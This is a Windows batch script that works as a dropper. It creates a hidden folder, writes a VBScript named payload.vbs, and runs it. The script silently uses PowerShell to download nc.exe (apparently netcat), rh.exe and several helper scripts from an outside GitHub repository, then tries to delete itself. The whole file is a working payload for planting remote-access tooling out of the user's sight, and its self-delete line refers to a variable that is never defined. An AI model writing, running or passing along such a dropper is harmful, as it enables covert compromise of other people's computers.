@echo off
mkdir C:\nc
attrib +h C:\nc


@echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> C:\nc\payload.vbs
@echo dim wshShell >> C:\nc\payload.vbs
@echo dim sUserName >> C:\nc\payload.vbs
@echo Set wshShell = WScript.CreateObject("WScript.Shell") >> C:\nc\payload.vbs
@echo sUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%") >> C:\nc\payload.vbs
@echo Set oShell = CreateObject("WScript.Shell") >> C:\nc\payload.vbs
@echo Set oFSO = CreateObject("Scripting.FileSystemObject") >> C:\nc\payload.vbs



@echo oShell.run ("cmd.exe /c powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://github.com/7ext34/7ext-34/raw/master/nc.exe','C:\nc\nc.exe')"), 0, True >> C:\nc\payload.vbs
@echo oShell.run ("cmd.exe /c powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://github.com/7ext34/7ext-34/raw/master/rh.exe','C:\nc\rh.exe')"), 0, True >> C:\nc\payload.vbs
@echo oShell.run ("cmd.exe /c powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://github.com/7ext34/7ext-34/raw/master/nc.vbs','C:\nc\nc.vbs')"), 0, True >> C:\nc\payload.vbs
@echo oShell.run ("cmd.exe /c powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://github.com/7ext34/7ext-34/raw/master/nc.bat','C:\nc\nc.bat')"), 0, True >> C:\nc\payload.vbs
@echo oShell.run ("cmd.exe /c powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://github.com/7ext34/7ext-34/raw/master/nc_run.bat','C:\nc\nc_run.bat')"), 0, True >> C:\nc\payload.vbs


@echo objFSO.DeleteFile(strScript) >> C:\nc\payload.vbs


timeout 10
start "" "C:\nc\payload.vbs"
